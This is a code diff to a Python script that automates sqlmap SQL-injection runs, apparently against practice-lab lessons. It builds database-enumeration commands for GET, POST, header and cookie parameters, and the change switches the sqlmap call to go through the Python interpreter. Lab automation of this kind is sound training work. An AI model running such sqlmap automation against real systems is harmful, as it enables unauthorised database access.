@@ -92,21 +92,26 @@ def automate_lesson(lesson_num, master_data, dry_run=False):
     log_path = str(dirs["automation"] / "sqlmap_auto.log")
     print("[*] Performing Systematic Data Flush...")
 
-    sqlmap_cmd = [SQLMAP_PATH, "-u", f"{BASE_URL}Less-{lesson_num}/?id=1",
-                  "--batch", "--dbs", "--proxy", PROXY]
+    # Invoke sqlmap as a script through the active Python interpreter so the
+    # `#!/usr/bin/env python` shebang in /usr/local/bin/sqlmap does not fail
+    # on systems that only ship `python3` (Ubuntu 22.04+, WSL2 default).
+    SQLMAP_INVOKE = [PYTHON_BIN, SQLMAP_PATH]
+
+    sqlmap_cmd = SQLMAP_INVOKE + ["-u", f"{BASE_URL}Less-{lesson_num}/?id=1",
+                                  "--batch", "--dbs", "--proxy", PROXY]
     if lesson_data['method'] == "POST":
         param = lesson_data['parameter']
-        sqlmap_cmd = [SQLMAP_PATH, "-u", f"{BASE_URL}Less-{lesson_num}/",
-                      "--data", f"{param}=1&submit=Submit",
-                      "--batch", "--dbs", "--proxy", PROXY]
+        sqlmap_cmd = SQLMAP_INVOKE + ["-u", f"{BASE_URL}Less-{lesson_num}/",
+                                      "--data", f"{param}=1&submit=Submit",
+                                      "--batch", "--dbs", "--proxy", PROXY]
     elif lesson_data['method'] == "HEADER":
         param = lesson_data['parameter']
-        sqlmap_cmd = [SQLMAP_PATH, "-u", f"{BASE_URL}Less-{lesson_num}/",
-                      f"--header={param}: 1*", "--batch", "--dbs", "--proxy", PROXY]
+        sqlmap_cmd = SQLMAP_INVOKE + ["-u", f"{BASE_URL}Less-{lesson_num}/",
+                                      f"--header={param}: 1*", "--batch", "--dbs", "--proxy", PROXY]
     elif lesson_data['method'] == "COOKIE":
         param = lesson_data['parameter']
-        sqlmap_cmd = [SQLMAP_PATH, "-u", f"{BASE_URL}Less-{lesson_num}/",
-                      "--cookie", f"{param}=1", "--batch", "--dbs", "--proxy", PROXY]
+        sqlmap_cmd = SQLMAP_INVOKE + ["-u", f"{BASE_URL}Less-{lesson_num}/",
+                                      "--cookie", f"{param}=1", "--batch", "--dbs", "--proxy", PROXY]
 
     if dry_run:
         print("[DRY-RUN] Skipping sqlmap flush.")
